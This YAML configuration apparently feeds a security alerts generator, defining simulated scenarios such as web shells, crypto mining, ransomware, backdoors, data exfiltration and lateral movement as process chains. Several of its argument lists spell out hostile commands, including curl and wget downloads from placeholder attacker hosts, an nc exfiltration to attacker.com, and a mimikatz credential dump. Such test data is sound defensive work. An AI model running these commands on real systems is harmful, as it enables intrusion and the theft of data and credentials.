# Security Alert Scenarios Configuration
# This file defines attack scenarios for the alerts generator

scenarios:
  - name: "Web Shell Deployment"
    description: "Web server compromised with malicious script"
    severity: "high"
    processes:
      - name: "apache2"
        executable: "/usr/sbin/apache2"
        args:
          - "/usr/sbin/apache2"
          - "-k"
          - "start"
        working_dir: "/var/www"
        user: "www-data"
      - name: "php-fpm"
        executable: "/usr/sbin/php-fpm"
        args:
          - "/usr/sbin/php-fpm"
          - "--fpm-config"
          - "/etc/php/fpm.conf"
        working_dir: "/var/www/html"
        user: "www-data"
      - name: "sh"
        executable: "/bin/sh"
        args:
          - "/bin/sh"
          - "-c"
          - "curl http://malicious.com/shell"
        working_dir: "/tmp"
        user: "www-data"
      - name: "webshell.php"
        executable: "/tmp/webshell.php"
        args:
          - "/tmp/webshell.php"
          - "exec"
          - "reverse"
        working_dir: "/tmp"
        user: "www-data"
    malware_file:
      name: "webshell.php"
      path: "/tmp/webshell.php"
      extension: ".php"

  - name: "Crypto Miner"
    description: "Cryptocurrency mining malware installation"
    severity: "medium"
    processes:
      - name: "systemd"
        executable: "/usr/lib/systemd/systemd"
        args:
          - "/usr/lib/systemd/systemd"
          - "--user"
        working_dir: "/"
        user: "root"
      - name: "cron"
        executable: "/usr/sbin/cron"
        args:
          - "/usr/sbin/cron"
          - "-f"
        working_dir: "/var/spool/cron"
        user: "root"
      - name: "wget"
        executable: "/usr/bin/wget"
        args:
          - "/usr/bin/wget"
          - "http://evil.com/miner"
          - "-O"
          - "/tmp/xmrig"
        working_dir: "/tmp"
        user: "nobody"
      - name: "xmrig"
        executable: "/tmp/xmrig"
        args:
          - "/tmp/xmrig"
          - "--donate-level=1"
          - "-o"
          - "pool.minexmr.com:4444"
        working_dir: "/tmp"
        user: "nobody"
    malware_file:
      name: "xmrig"
      path: "/tmp/xmrig"
      extension: ""

  - name: "Ransomware"
    description: "File encryption ransomware attack"
    severity: "critical"
    processes:
      - name: "explorer.exe"
        executable: "C:\\Windows\\explorer.exe"
        args:
          - "C:\\Windows\\explorer.exe"
        working_dir: "C:\\Users\\victim"
        user: "victim"
      - name: "powershell.exe"
        executable: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        args:
          - "powershell.exe"
          - "-ExecutionPolicy"
          - "Bypass"
          - "-File"
          - "C:\\Temp\\dropper.ps1"
        working_dir: "C:\\Temp"
        user: "victim"
      - name: "encrypt.exe"
        executable: "C:\\Temp\\encrypt.exe"
        args:
          - "C:\\Temp\\encrypt.exe"
          - "--target"
          - "C:\\Users"
          - "--extension"
          - ".locked"
        working_dir: "C:\\Temp"
        user: "victim"
    malware_file:
      name: "encrypt.exe"
      path: "C:\\Temp\\encrypt.exe"
      extension: ".exe"

  - name: "Privilege Escalation"
    description: "Local privilege escalation exploit"
    severity: "high"
    processes:
      - name: "bash"
        executable: "/bin/bash"
        args:
          - "/bin/bash"
        working_dir: "/home/user"
        user: "user"
      - name: "sudo"
        executable: "/usr/bin/sudo"
        args:
          - "/usr/bin/sudo"
          - "-u"
          - "root"
          - "/tmp/exploit"
        working_dir: "/tmp"
        user: "user"
      - name: "exploit"
        executable: "/tmp/exploit"
        args:
          - "/tmp/exploit"
          - "--target"
          - "kernel"
        working_dir: "/tmp"
        user: "user"
      - name: "rootshell"
        executable: "/bin/bash"
        args:
          - "/bin/bash"
          - "-i"
        working_dir: "/root"
        user: "root"
    malware_file:
      name: "exploit"
      path: "/tmp/exploit"
      extension: ""

  - name: "Backdoor Installation"
    description: "Persistent backdoor installation"
    severity: "critical"
    processes:
      - name: "sshd"
        executable: "/usr/sbin/sshd"
        args:
          - "/usr/sbin/sshd"
          - "-D"
        working_dir: "/"
        user: "root"
      - name: "bash"
        executable: "/bin/bash"
        args:
          - "/bin/bash"
        working_dir: "/root"
        user: "root"
      - name: "curl"
        executable: "/usr/bin/curl"
        args:
          - "/usr/bin/curl"
          - "-o"
          - "/usr/local/bin/backdoor"
          - "http://c2.evil.com/backdoor"
        working_dir: "/tmp"
        user: "root"
      - name: "backdoor"
        executable: "/usr/local/bin/backdoor"
        args:
          - "/usr/local/bin/backdoor"
          - "--persist"
          - "--hide"
        working_dir: "/usr/local/bin"
        user: "root"
    malware_file:
      name: "backdoor"
      path: "/usr/local/bin/backdoor"
      extension: ""

  - name: "Data Exfiltration"
    description: "Sensitive data theft and exfiltration"
    severity: "high"
    processes:
      - name: "postgres"
        executable: "/usr/lib/postgresql/13/bin/postgres"
        args:
          - "postgres"
          - "-D"
          - "/var/lib/postgresql/13/main"
        working_dir: "/var/lib/postgresql"
        user: "postgres"
      - name: "psql"
        executable: "/usr/bin/psql"
        args:
          - "/usr/bin/psql"
          - "-c"
          - "COPY users TO '/tmp/data.csv'"
        working_dir: "/tmp"
        user: "postgres"
      - name: "tar"
        executable: "/usr/bin/tar"
        args:
          - "/usr/bin/tar"
          - "czf"
          - "/tmp/exfil.tar.gz"
          - "/tmp/data.csv"
        working_dir: "/tmp"
        user: "postgres"
      - name: "nc"
        executable: "/usr/bin/nc"
        args:
          - "/usr/bin/nc"
          - "attacker.com"
          - "4444"
          - "<"
          - "/tmp/exfil.tar.gz"
        working_dir: "/tmp"
        user: "postgres"
    malware_file:
      name: "exfil.tar.gz"
      path: "/tmp/exfil.tar.gz"
      extension: ".tar.gz"

  - name: "Lateral Movement"
    description: "Credential theft and lateral movement"
    severity: "critical"
    processes:
      - name: "svchost.exe"
        executable: "C:\\Windows\\System32\\svchost.exe"
        args:
          - "C:\\Windows\\System32\\svchost.exe"
          - "-k"
          - "netsvcs"
        working_dir: "C:\\Windows\\System32"
        user: "SYSTEM"
      - name: "rundll32.exe"
        executable: "C:\\Windows\\System32\\rundll32.exe"
        args:
          - "rundll32.exe"
          - "C:\\Temp\\mimikatz.dll"
          - "DumpCreds"
        working_dir: "C:\\Temp"
        user: "SYSTEM"
      - name: "mimikatz.exe"
        executable: "C:\\Temp\\mimikatz.exe"
        args:
          - "C:\\Temp\\mimikatz.exe"
          - "sekurlsa::logonpasswords"
        working_dir: "C:\\Temp"
        user: "SYSTEM"
      - name: "psexec.exe"
        executable: "C:\\Temp\\psexec.exe"
        args:
          - "psexec.exe"
          - "\\\\remote-host"
          - "cmd.exe"
        working_dir: "C:\\Temp"
        user: "SYSTEM"
    malware_file:
      name: "mimikatz.exe"
      path: "C:\\Temp\\mimikatz.exe"
      extension: ".exe"
